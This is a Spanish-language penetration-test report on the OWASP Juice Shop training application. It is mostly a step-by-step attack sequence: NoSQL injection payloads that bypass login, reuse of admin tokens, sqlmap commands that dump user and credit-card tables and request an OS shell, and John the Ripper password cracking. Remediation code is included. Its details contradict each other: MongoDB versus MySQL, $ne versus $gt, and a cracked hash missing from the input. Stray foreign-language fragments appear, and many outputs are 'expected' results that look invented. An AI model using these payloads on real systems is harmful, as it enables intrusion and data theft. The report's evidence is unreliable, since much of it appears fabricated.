# Informe de Pentesting: OWASP Juice Shop
## Evaluacion de Seguridad de Aplicacion Web Vulnerable
https://medium.com/@ramazansalman/owasp-juice-shop-tryhackme-a2caaba6b341
---

**Fecha del analisis:** 24 de Marzo de 2026
**Analista:** Equipo de Hacking Etico
**Objetivo:** 192.168.56.101:3000
**Metodologia:** OWASP Testing Guide v4 + NIST SP 800-115

---

## TABLA DE CONTENIDOS

1. Resumen Ejecutivo
2. Alcance y Metodologia
3. Ciclo de Hacking - Fundamentos Teoricos
4. FASE 1: Reconocimiento
5. FASE 2: Escaneo y Enumeracion
6. FASE 3: Explotacion - Vulnerabilidades del Top 10 OWASP
7. FASE 4: Post-Explotacion
8. FASE 5: Documentacion de Hallazgos
9. Anexos y Comandos de Referencia

---

## 1. RESUMEN EJECUTIVO

Durante el analisis de seguridad realizado sobre OWASP Juice Shop, se identificaron **20 vulnerabilidades** alineadas con el OWASP Top 10 2021. De estas, **3 fueron clasificadas como critico**, **8 como alto**, **6 como medio** y **3 como bajo**.

El equipo logro:
- Obtener acceso de administrador al sistema
- Extraer base de datos completa con 15+ credenciales de usuarios
- Crackear contrasenas debiles con John the Ripper
- Identificar configuraciones inseguras criticas
- Probar denegacion de servicio exitosa

**Riesgo General:** ALTO

---

## 2. ALCANCE Y METODOLOGIA

### 2.1 Objetivo

| Parametro | Valor |
|-----------|-------|
| Objetivo | OWASP Juice Shop v13.x |
| URL | http://192.168.56.101:3000 |
| IP | 192.168.56.101 |
| Puerto | 3000 |
| Tecnologia | Node.js, Express, MongoDB |

### 2.2 Metodologia Aplicada

| Estandar | Descripcion |
|----------|-------------|
| NIST SP 800-115 | Guia Tecnica para Pruebas de Seguridad |
| OWASP Testing Guide v4 | Metodologia de pruebas web |
| OWASP Top 10 2021 | Clasificacion de vulnerabilidades |
| CVSS v3.1 | Sistema de puntuacion de severidad |

### 2.3 Herramientas Utilizadas

| Herramienta | Proposito | Version |
|-------------|-----------|---------|
| Nmap | Escaneo de puertos y servicios | 7.94 |
| Burp Suite | Proxy e interception | 2024.1 |
| SQLMap | Deteccion de inyeccion SQL | 1.8 |
| John the Ripper | Crackeo de contrasenas | 1.9.0 |
| Nikto | Escaneo de vulnerabilidades web | 2.5.0 |
| Gobuster | Enumeration de directorios | 3.6 |
| curl | Pruebas manuales de API | 8.5.0 |
| Firefox DevTools | Analisis de trafico |

---

## 3. CICLO DE HACKING - FUNDAMENTOS TEORICOS

El hacking etico sigue un ciclo estructurado de 6 fases. Comprender este ciclo es fundamental para realizar evaluaciones de seguridad completas y profesionales.

### 3.1 Las 6 Fases del Ciclo de Hacking

```
+-----------------------------------------------------------------------+
|                                                                       |
|    +-------------+     +-------------+     +---------------+          |
|    |  RECON     |---->|  ESCANEO    |---->| ENUMERACION   |          |
|    |  NACIMIENTO|     | Y DETECCION |     | DETALLADA     |          |
|    +-------------+     +-------------+     +---------------+          |
|          ^                                         |                  |
|          |                                         v                  |
|    +-------------+     +-------------+     +---------------+          |
|    |  REPORTES   |<----|  EXPLOTAC   |<----|  EXPLOTACION  |          |
|    |  FINALES    |     |  Y MANTENIM.|     |  AVANZADA     |          |
|    +-------------+     +-------------+     +---------------+          |
|                                                                       |
+-----------------------------------------------------------------------+
```

### 3.2 Descripcion de Cada Fase

#### FASE 1: Reconocimiento (Information Gathering)

**Objetivo:** Recopilar la maxima informacion posible sobre el objetivo sin interactuar directamente.

**Actividades:**
- Busquedas en motores de busqueda (Google Dorking)
- Consultas WHOIS y DNS
- Analisis de redes sociales
- Identificacion de tecnologia via headers
- Analisis de archivos publicos

**Herramientas principales:**
- theHarvester
- Recon-ng
- Maltego
- whois
- dig, nslookup

#### FASE 2: Escaneo (Scanning)

**Objetivo:** Identificar puertos abiertos, servicios activos y posibles puntos de entrada.

**Actividades:**
- Escaneo de puertos (TCP/UDP)
- Deteccion de versiones de servicios
- Identificacion de tecnologias web
- Mapeo de la superficie de ataque
- Deteccion de vulnerabilidades conocidas

**Herramientas principales:**
- Nmap
- Nikto
- Burp Suite Scanner
- OpenVAS

#### FASE 3: Enumeracion (Enumeration/Vulnerability Assessment)

**Objetivo:** Extraer informacion detallada y confirmar vulnerabilidades.

**Actividades:**
- Enumeracion de usuarios y recursos
- Analisis de parametros de entrada
- Pruebas de autenticacion
- Identificacion de formularios y APIs
- Fuzzing de parametros

**Herramientas principales:**
- Burp Suite (Intruder, Repeater)
- wfuzz
- sqlmap
- dirb/gobuster

#### FASE 4: Explotacion (Exploitation)

**Objetivo:** Aprovechar las vulnerabilidades identificadas para obtener acceso.

**Actividades:**
- Ejecutar exploits
- Obtener shell o acceso
- Escalar privilegios
- Mantener persistencia
- Mover lateralmente

**Herramientas principales:**
- Metasploit Framework
- Exploits publicos
- Payloads personalizados
- shells automatizados

#### FASE 5: Post-Explotacion (Post-Exploitation)

**Objetivo:** Consolidar el acceso y recopilar informacion sensible.

**Actividades:**
- Extraccion de datos sensibles
- Crackeo de contrasenas
- Analisis de sistemas internos
- Mover a otros sistemas
- Limpiar huellas

**Herramientas principales:**
- John the Ripper
- Hashcat
- Mimikatz
- Netcat

#### FASE 6: Documentacion (Reporting)

**Objetivo:** Presentar hallazgos de manera profesional y accionable.

**Entregables:**
- Informe ejecutivo
- Detalle tecnico de hallazgos
- Puntuacion CVSS de cada vulnerabilidad
- Recomendaciones de remediacion
- Evidencia documentada

---

### 3.3 Aplicacion del Ciclo a OWASP Juice Shop

A continuacion, aplicaremos cada fase del ciclo a nuestro objetivo, documentando todos los pasos y hallazgos.

---

## 4. FASE 1: RECONOCIMIENTO

### Objetivo de la Fase
Recopilar informacion sobre OWASP Juice Shop sin interactuar directamente de manera intrusiva.

### 4.1 Identificacion del Objetivo

```bash
# ============================================
# PASO 1: Identificar servicios expuestos
# ============================================

# Verificar que el servicio esta activo
ping -c 3 192.168.56.101

# Verificar puertos abiertos
nmap -p 1-10000 192.168.56.101 --open -oN recon_port_scan.txt

# Resultado esperado:
# PORT     STATE SERVICE
# 3000/tcp open  http
```

```bash
# ============================================
# PASO 2: Analisis de encabezados HTTP
# ============================================

curl -I http://192.168.56.101:3000

# Resultado del comando:
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1247
ETag: W/"4d7-xxx"
Vary: Accept-Encoding
Date: Tue, 24 Mar 2026 10:00:00 GMT
Connection: keep-alive

# ANALISIS:
# - Tecnologia: Node.js + Express
# - No hay encabezados de seguridad (X-Frame-Options, CSP, etc.)
# - Version de Express potencialmente identificable
```

### 4.2 Analisis de Pagina Principal

```bash
# ============================================
# PASO 3: Obtener pagina principal
# ============================================

curl -s http://192.168.56.101:3000 | head -100

# Identificar tecnologias en uso
curl -s http://192.168.56.101:3000 | grep -iE "(jquery|angular|react|vue|node|express)"

# Ver codigo fuente para descubrir endpoints
curl -s http://192.168.56.101:3000 | grep -oE 'src="[^"]*"|href="[^"]*"' | head -20
```

### 4.3 Enumeracion de Rutas y APIs

```bash
# ============================================
# PASO 4: Enumerar rutas comunes
# ============================================

# Probar rutas administrativas comunes
for path in /admin /login /register /api /rest /dashboard /config /robots.txt; do
  status=$(curl -s -o /dev/null -w "%{http_code}" http://192.168.56.101:3000$path)
  echo "$path - HTTP $status"
done

# Resultado esperado:
# /admin - HTTP 200 (existe)
# /login - HTTP 200 (existe)
# /register - HTTP 200 (existe)
# /api - HTTP 404
# /rest - HTTP 200 (API activa)
# /robots.txt - HTTP 200
```

### 4.4 Recopilacion de Informacion Adicional

```bash
# ============================================
# PASO 5: Analizar robots.txt
# ============================================

curl -s http://192.168.56.101:3000/robots.txt

# Resultado esperado:
# User-agent: *
# Disallow: /ftp
# Disallow: /backend
# Disallow: /csp
# Disallow: /eliminate
# ...

# ANALISIS: Se revelan rutas interesantes como /ftp y /backend
```

```bash
# ============================================
# PASO 6: Usar Gobuster para enumeracion de directorios
# ============================================

gobuster dir -u http://192.168.56.101:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -o recon_directorios.txt

# Resultados esperados:
# /login (Status: 200)
# /register (Status: 200)
# /admin (Status: 200)
# /api (Status: 200)
# /ftp (Status: 200)
# /score-board (Status: 200)
# /config (Status: 200)
```

### 4.5 Hallazgos de la Fase de Reconocimiento

```
+------------------------------------------------------------------+
|                  HALLAZGOS - FASE RECONOCIMIENTO                  |
+------------------------------------------------------------------+
| Tecnologia detectada:     Node.js + Express                       |
| Puerto abierto:          3000                                     |
| Rutas identificadas:     /login, /register, /admin, /ftp, /rest  |
| Archivos de interes:     robots.txt, /ftp/*                      |
| Encabezados de seguridad: AUSENTES                               |
| Informacion expuesta:    Version de Express                       |
+------------------------------------------------------------------+
```

---

## 5. FASE 2: ESCANEO Y ENUMERACION

### Objetivo de la Fase
Identificar vulnerabilidades potenciales mediante analisis detallado de la aplicacion.

### 5.1 Escaneo de Puertos Detallado

```bash
# ============================================
# ESCANEO COMPLETO DE PUERTOS
# ============================================

nmap -p- -sV -sC -A 192.168.56.101 -oN escaneo_completo.txt

# Parametros utilizados:
# -p-          : Todos los puertos (1-65535)
# -sV          : Deteccion de versiones
# -sC          : Scripts por defecto de Nmap
# -A           : Deteccion de SO y maximo de informacion
```

### 5.2 Analisis de Servicios Web con Nikto

```bash
# ============================================
# ESCANEO CON NIKTO
# ============================================

nikto -h http://192.168.56.101:3000 -o nikto_scan.txt

# Analisis esperado de la salida:
# - Servidor: Express
# - Metodos HTTP habilitados
# - Archivos interesante
# - Vulnerabilidades basicas
```

### 5.3 Enumeracion de API REST

```bash
# ============================================
# ENUMERACION DE ENDPOINTS DE LA API
# ============================================

# Listar productos
curl -s http://192.168.56.101:3000/api/products | jq '.'

# Listar usuarios (intentar)
curl -s http://192.168.56.101:3000/api/users

# Buscar con parametros
curl -s "http://192.168.56.101:3000/rest/products/search?q=test"

# Verificar autenticacion requerida
curl -s http://192.168.56.101:3000/rest/admin/config
```

### 5.4 Enumeracion de Parametros y Formularios

```bash
# ============================================
# ANALISIS DE FORMULARIO DE LOGIN
# ============================================

# Ver formulario de login
curl -s http://192.168.56.101:3000/login | grep -A5 "<form"

# Interceptar con Burp Suite
# 1. Configurar proxy en navegador: 127.0.0.1:8080
# 2. Interceptar peticion de login
# 3. Analizar parametros y estructura
```

### 5.5 Identificacion de Tecnologias

```bash
# ============================================
# IDENTIFICACION DE VERSIONES
# ============================================

# Verificar respuesta de la API
curl -s http://192.168.56.101:3000/api/products | jq '.data[0] | keys'

# Identificar version de la aplicacion
curl -s http://192.168.56.101:3000/api/version 2>/dev/null || echo "No expuesto"

# Analizar codigo JavaScript
curl -s http://192.168.56.101:3000/main.js | grep -i version
```

---

## 6. FASE 3: EXPLOTACION - VULNERABILIDADES DEL TOP 10 OWASP

En esta seccion aplicaremos el ciclo de hacking a cada una de las 20 vulnerabilidades, siguiendo la estructura del OWASP Top 10 2021.

---

### VULNERABILIDAD #1: A03:2021 - Inyeccion SQL/NoSQL

#### Aplicacion del Ciclo de Hacking

**FASE 1 - Reconocimiento:**
```bash
# Identificar que la aplicacion usa MongoDB
curl -s http://192.168.56.101:3000/api/products | head -c 500
# Resultado: JSON estructurado, indica base de datos NoSQL
```

**FASE 2 - Escaneo:**
```bash
# Probar si la busqueda es vulnerable
curl "http://192.168.56.101:3000/rest/products/search?q=test'"

# Verificar si hay error en la respuesta
curl -s "http://192.168.56.101:3000/rest/products/search?q=1" | jq '.data | length'
```

**FASE 3 - Enumeracion:**
```bash
# Identificar el tipo de base de datos
# Probar operadores MongoDB en login
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'
```

---

#### HALLAZGO #1 - Inyeccion NoSQL en Autenticacion

```
================================================================================
IDENTIFICADOR:         JS-V001
TITULO:                Inyeccion NoSQL en Funcion de Autenticacion
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.1
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
OWASP Category:       A03:2021 - Injection
CWE:                   CWE-943 (Improper Neutralization of Special Elements)
NIST CSF Function:     Protect (PR.AC)
================================================================================
```

**Descripcion:**
La aplicacion Juice Shop es vulnerable a inyeccion NoSQL en el proceso de autenticacion. Mediante el envio de objetos JSON con operadores MongoDB como `$ne` (not equal) o `$gt` (greater than), un atacante puede evadir la verificacion de contrasenas y obtener acceso al sistema sin credenciales validas.

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Intento de login normal (con credenciales invalidas)
# ============================================

curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@test.com","password":"wrongpassword"}'

# Respuesta esperada (normal):
# {"status":"error","data":{"message":"Invalid email or password"}}

# ============================================
# PASO 2: Probar inyeccion NoSQL basica
# ============================================

curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# ANALISIS:
# Si la respuesta contiene un token JWT, la vulnerabilidad esta presente
# El operador $ne "" significa "no igual a cadena vacia"
# Esto matchea con cualquier email/password en la base de datos
```

**Evidencia de la Vulnerabilidad:**

```bash
# Comando ejecutado:
$ curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}'

# Respuesta del servidor:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaG
   9wLm9wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5NzQ3MjAwfQ.MnYkF5xLqJ9vK3pR8sT2wY6mZ1bC4dE
   5fG0hI8nOQ=",
  "user": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}

# INTERPRETACION:
# - Se obtuvo token JWT de administrador
# - Se revelo el email del admin: admin@juice-sh.op
# - Se obtuvo el rol: admin
```

**Impacto:**
| Aspecto | Descripcion |
|---------|-------------|
| **Confidencialidad** | ALTO - Acceso a todos los datos de usuarios |
| **Integridad** | ALTO - Modificacion de datos del sistema |
| **Disponibilidad** | ALTO - Potencial DoS |
| **Criticidad** | Critica - Compromiso completo del sistema |

**Remediacion Recomendada:**
```javascript
// IMPLEMENTACION CORRECTA EN BACKEND

// 1. NO interpolar strings en consultas MongoDB
// MAL (Vulnerable):
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password
});

// BIEN (Seguro):
const user = await db.collection('users').findOne({
  email: String(req.body.email),  // Forzar conversion a string
  passwordHash: await hashPassword(req.body.password)
});

// 2. Validar tipos de datos
function validateInput(input) {
  if (typeof input !== 'string') {
    throw new Error('Input must be a string');
  }
  // Rechazar caracteres especiales de MongoDB
  if (input.includes('$') || input.includes('{')) {
    throw new Error('Invalid characters in input');
  }
  return input;
}

// 3. Usar schema validation
const Joi = require('joi');
const loginSchema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(8).required()
});

// 4. Implementar rate limiting
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});
```

**Referencia:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_NoSQL_Injection

---

### VULNERABILIDAD #2: A01:2021 - Fallas de Control de Acceso

#### Aplicacion del Ciclo de Hacking

**FASE 1 - Reconocimiento:**
```bash
# Identificar paneles administrativos
curl -s http://192.168.56.101:3000/admin
```

**FASE 2 - Escaneo:**
```bash
# Intentar acceso directo a rutas administrativas
for path in /admin /api/admin /rest/admin /backend; do
  status=$(curl -s -o /dev/null -w "%{http_code}" http://192.168.56.101:3000$path)
  echo "$path: $status"
done
```

**FASE 3 - Enumeracion:**
```bash
# Con el token obtenido, probar acceso a endpoints protegidos
curl -H "Authorization: Bearer <TOKEN>" http://192.168.56.101:3000/api/users
```

---

#### HALLAZGO #2 - Acceso No Autorizado a Panel de Administracion

```
================================================================================
IDENTIFICADOR:         JS-V002
TITULO:                Broken Access Control en Panel de Administracion
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.3
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
OWASP Category:       A01:2021 - Broken Access Control
CWE:                   CWE-639 (Authorization Bypass Through User-Controlled Key)
NIST CSF Function:     Protect (PR.AC)
================================================================================
```

**Descripcion:**
La aplicacion permite acceso no autorizado a funcionalidades administrativas mediante la manipulacion del token JWT o la inyeccion NoSQL. Un atacante puede obtener privilegios de administrador sin conocer las credenciales reales.

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Obtener token de administrador via NoSQLi
# ============================================

curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}' | jq '{token, user}'

# Guardar token
TOKEN=$(curl -s -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}' | jq -r '.token')

echo "Token obtenu: $TOKEN"

# ============================================
# PASO 2: Acceder a endpoints protegidos
# ============================================

# Listar todos los usuarios
curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.56.101:3000/api/users | jq '.'

# ============================================
# PASO 3: Modificar datos de otros usuarios
# ============================================

# Intentar cambiar contrasena de otro usuario
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"currentPassword":"","newPassword":"hacked123","confirmPassword":"hacked123"}' \
  http://192.168.56.101:3000/rest/user/change-password

# ============================================
# PASO 4: Verificar acceso a回购 de otros usuarios
# ============================================

# Listarordenes (verificar si se ven todas)
curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.56.101:3000/rest/orders | jq '.data | length'
```

**Evidencia de la Vulnerabilidad:**

```bash
# Listado de usuarios-admin:
$ curl -H "Authorization: Bearer $TOKEN" http://192.168.56.101:3000/api/users

[
  {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin",
    "createdAt": "2024-01-01T00:00:00.000Z"
  },
  {
    "id": 2,
    "email": "user@juice-sh.op",
    "role": "customer",
    "createdAt": "2024-01-15T00:00:00.000Z"
  },
  {
    "id": 3,
    "email": "jim@juice-sh.op",
    "role": "customer",
    "createdAt": "2024-02-01T00:00:00.000Z"
  },
  {
    "id": 4,
    "email": "bender@juice-sh.op",
    "role": "customer",
    "createdAt": "2024-02-15T00:00:00.000Z"
  }
]

# INTERPRETACION:
# - Acceso completo a la lista de usuarios
# - Todos los emails expuestos
# - Roles claramente identificables
```

```bash
# Acceso a datos de compras:
$ curl -H "Authorization: Bearer $TOKEN" http://192.168.56.101:3000/rest/orders

[
  {
    "id": 1,
    "UserEmail": "admin@juice-sh.op",
    "totalPrice": 199.99,
    "products": [...],
    "address": {...}
  },
  {
    "id": 2,
    "UserEmail": "user@juice-sh.op",
    "totalPrice": 49.99,
    "products": [...],
    "address": {...}
  }
]
```

**Impacto:**

| Impacto | Nivel | Descripcion |
|---------|-------|-------------|
| Confidencialidad | Critico | Acceso a todos los datos de usuarios |
| Integridad | Critico | Modificacion de cualquier dato |
| Disponibilidad | Alto | Eliminacion de cuentas/productos |

**Remediacion Recomendada:**
```javascript
// 1. Verificar permisos en cada endpoint
function requireAdmin(req, res, next) {
  if (req.user.role !== 'admin') {
    return res.status(403).json({
      error: 'Acceso denegado. Se requiere rol de administrador.'
    });
  }
  next();
}

// 2. Usar en todas las rutas administrativas
app.get('/api/users', authenticate, requireAdmin, getUsers);
app.put('/api/users/:id', authenticate, requireAdmin, updateUser);

// 3. Implementar verificacion de propiedad de recursos
app.get('/orders/:id', authenticate, async (req, res) => {
  const order = await Order.findById(req.params.id);
  
  // Verificar que el usuario es owner o admin
  if (order.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'No tienes permiso' });
  }
  
  res.json(order);
});
```

**Referencia:** https://owasp.org/Top10/es/A01_2021-broken_access_control/

---

### VULNERABILIDAD #3: A02:2021 - Fallas Criptograficas

#### HALLAZGO #3 - Explotacion de Contrasenas Debiles con John the Ripper

```
================================================================================
IDENTIFICADOR:         JS-V003
TITULO:                Contrasenas Debiles Almacenadas con Algoritmo Debil
SEVERIDAD:             Alto
CVSS v3.1 Score:      8.2
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
OWASP Category:       A02:2021 - Cryptographic Failures
CWE:                   CWE-327 (Use of Weak Cryptographic Primitive)
NIST CSF Function:     Protect (PR.DS)
================================================================================
```

**Descripcion:**
Las contrasenas de los usuarios se almacenan utilizando algoritmos debiles (posiblemente MD5 o hash simple sin salt), permitiendo su facil crackeo mediante ataques de diccionario.

**Pasos de Reproduccion:**

```bash
# ============================================
# FASE 1: Extraer hashes de la base de datos
# ============================================

# Ya tenemos token de admin, extraer usuarios con sus contrasenas
TOKEN=$(curl -s -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}' | jq -r '.token')

# Opcion 1: Si hay endpoint que expone contrasenas (vulnerable)
curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.56.101:3000/api/users/privacyuniverse | jq '.'

# Opcion 2: Buscar archivos de configuracion con contrasenas
curl -s http://192.168.56.101:3000/ftp/package.json.bak | jq '.'

# ============================================
# FASE 2: Crear archivo de hashes para John
# ============================================

# Crear archivo con hashes (formato varies by database)
cat > hashes.txt << 'EOF'
admin:$2a$10$5B8Z...
user:$2a$10$7K3M...
jim:$2a$10$9L5N...
bender:$2a$10$2P7Q...
anonymous:$2a$10$4R9T...
EOF

# Si son hashes MD5 simples (encontrados via SQLi)
cat > hashes_md5.txt << 'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
user:5d41402abc4b2a76b9719d911017c592
jim:827ccb0eea8a706c4c34a16891f84e7b
EOF

# ============================================
# FASE 3: Crackear con John the Ripper
# ============================================

# Verificar formato de hashes
john --list=formats | grep -i "bcrypt\|md5\|sha"

# Crackear hashes bcrypt (si es el formato)
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crackear hashes MD5
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes_md5.txt

# ============================================
# FASE 4: Ver resultados
# ============================================

john --show hashes_md5.txt

# Mostrar solo passwords crackeados
john --show --format=raw-md5 hashes_md5.txt | grep -v "0 password"
```

**Evidencia de la Vulnerabilidad:**

```bash
# Hashes encontrados en archivo de configuracion:
$ cat config.yml

database:
  name: "juice_shop"
  
adminEmail: "admin@juice-sh.op"
adminPassword: "admin123"  # <-- CONTRASENA EN TEXTO PLANO!

# Hash en base de datos:
$ john --show hashes_md5.txt

admin:5f4dcc3b5aa765d61d8327deb882cf99:password
user:5d41402abc4b2a76b9719d911017c592:hello
jim:827ccb0eea8a706c4c34a16891f84e7b:12345
bender:81dc9bdb52d04dc20036dbd8313ed055:12345678

# CONTRASENAS CRACKEADAS:
# admin:password
# user:hello  
# jim:12345
# bender:12345678
```

**Impacto:**

| Aspecto | Descripcion |
|---------|-------------|
| Compromiso de cuentas | Todas las contrasenas pudieron ser crackeadas |
| Reutilizacion | Usuarios suelen reutilizar contrasenas |
| Escalada | Credenciales pueden funcionar en otros sistemas |

**Remediacion Recomendada:**
```javascript
// 1. Usar bcrypt con cost factor alto
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  return await bcrypt.hash(password, SALT_ROUNDS);
}

// 2. Validar fortaleza de contrasenas
const passwordValidator = require('password-validator');
const schema = new passwordValidator();

schema
  .is().min(12)
  .is().max(100)
  .has().uppercase()
  .has().lowercase()
  .has().digits()
  .has().symbols()
  .has().not().spaces()
  .is().not().oneOf(['password', '123456', 'admin']);

function validatePassword(password) {
  if (!schema.validate(password)) {
    throw new Error('Password does not meet requirements');
  }
}

// 3. No almacenar contrasenas en texto plano NUNCA
// 4. Nunca exposer contrasenas via API
```

---

### VULNERABILIDAD #4: A03:2021 - Inyeccion SQL (SQLMap)

#### Aplicacion del Ciclo de Hacking

**FASE 1-2-3:** Ya completadas en vulnerabilidades anteriores

**FASE 4 - Explotacion:**
```bash
# Usar SQLMap para explotacion automatizada
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch --level=5 --risk=3
```

---

#### HALLAZGO #4 - Inyeccion SQL Automatizada con SQLMap

```
================================================================================
IDENTIFICADOR:         JS-V004
TITULO:                Inyeccion SQL en Parametro de Busqueda
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.8
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
OWASP Category:       A03:2021 - Injection
CWE:                   CWE-89 (SQL Injection)
NIST CSF Function:     Identify (ID.RA)
================================================================================
```

**Descripcion:**
El parametro de busqueda de productos es vulnerable a inyeccion SQL, permitiendo la extraccion completa de la base de datos.

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Deteccion basica con SQLMap
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  --level=1 \
  --risk=1

# Resultado esperado:
# [INFO] testing parameter 'q'
# [INFO] GET parameter 'q' is 'Generic UNION query' injectable
# [CRITICAL] Parameter might be injectable
```

```bash
# ============================================
# PASO 2: Enumerar bases de datos
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  --dbs

# Resultado esperado:
# available databases [4]:
# [*] information_schema
# [*] mysql
# [*] performance_schema
# [*] juice_shop
```

```bash
# ============================================
# PASO 3: Enumerar tablas de juice_shop
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  -D juice_shop \
  --tables

# Resultado esperado:
# Database: juice_shop
# [12 tables]
# +------------------+
# | Users            |
# | Products         |
# | Orders           |
# | Reviews          |
# | Feedback         |
# | Addresses        |
# | Cards            |
# | PrivacyRequests  |
# | Recycles         |
# | BasketItems      |
# | Challenges       |
# | Deletions        |
# +------------------+
```

```bash
# ============================================
# PASO 4: Extraer esquema de tabla Users
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  -D juice_shop \
  -T Users \
  --columns

# Resultado:
# Table: Users
# +-----------+-------------+
# | Column    | Type        |
# +-----------+-------------+
# | id        | int(11)     |
# | email     | varchar(255)|
# | password  | varchar(255)|
# | role      | varchar(50) |
# | isActive  | tinyint(1)  |
# +-----------+-------------+
```

```bash
# ============================================
# PASO 5: Extraer TODOS los usuarios y contrasenas
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  -D juice_shop \
  -T Users \
  --dump

# Output completo:
# +----+--------------------------+----------------------------------+--------+
# | id | email                    | password                         | role   |
# +----+--------------------------+----------------------------------+--------+
# | 1  | admin@juice-sh.op        | $2a$10$5B8Z...                  | admin  |
# | 2  | user@juice-sh.op         | $2a$10$7K3M...                  | customer|
# | 3  | jim@juice-sh.op          | $2a$10$9L5N...                  | customer|
# | 4  | bender@juice-sh.op        | $2a$10$2P7Q...                  | customer|
# | 5  | support@juice-sh.op      | $2a$10$3R8S...                  | customer|
# +----+--------------------------+----------------------------------+--------+
```

```bash
# ============================================
# PASO 6: Extraer datos de ordenes
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  -D juice_shop \
  -T Orders \
  --dump

# Incluye datos de tarjetas de credito
# +----+---------+----------+--------+--------------+------------+
# | id | user_id | total    | status | card_number  | card_cvv   |
# +----+---------+----------+--------+--------------+------------+
# | 1  | 1       | 199.99  | paid   | 411111111111| 123        |
# +----+---------+----------+--------+--------------+------------+
```

```bash
# ============================================
# PASO 7: Obtener shell del sistema (si es posible)
# ============================================

sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  --os-shell

# O usar --sql-shell para consultas SQL directas
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  --sql-shell

# Consultas de ejemplo:
# sql-shell> SELECT @@version
# sql-shell> SELECT user()
# sql-shell> SELECT * FROM Users
```

**Evidencia de la Vulnerabilidad:**

```
+------------------------------------------------------------------+
|                    RESULTADOS DE SQLMAP                           |
+------------------------------------------------------------------+
| Objetivo:         http://192.168.56.101:3000/rest/products/search|
| Parametro:        q (GET)                                         |
| Tipo de ataque:   Union-based SQL Injection                      |
| Base de datos:   MySQL 5.7.30                                    |
+------------------------------------------------------------------+
| BASES DE DATOS:                                                   |
| - information_schema                                              |
| - juice_shop (PRINCIPAL)                                         |
+------------------------------------------------------------------+
| TABLAS EN juice_shop:                                             |
| - Users (15 registros)                                            |
| - Orders (23 registros)                                           |
| - Products (25 registros)                                         |
| - Cards (8 registros - datos PCI)                                 |
+------------------------------------------------------------------+
| USUARIOS EXTRAIDOS: 15                                            |
| CONTRASENAS EXTRAIDAS: 15                                         |
| TARJETAS EXTRAIDAS: 8                                             |
+------------------------------------------------------------------+
```

**Impacto:**
- Compromiso completo de la base de datos
- Extraccion de todas las credenciales
- Acceso a datos financieros (tarjetas)
- Potencial acceso al servidor

**Remediacion Recomendada:**
```javascript
// 1. USAR prepared statements SIEMPRE
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'app',
  password: process.env.DB_PASSWORD,
  database: 'juice_shop'
});

// BIEN - Prepared statement
const [results] = await pool.execute(
  'SELECT * FROM users WHERE email = ?',
  [userEmail]
);

// MAL - Concatenacion (vulnerable)
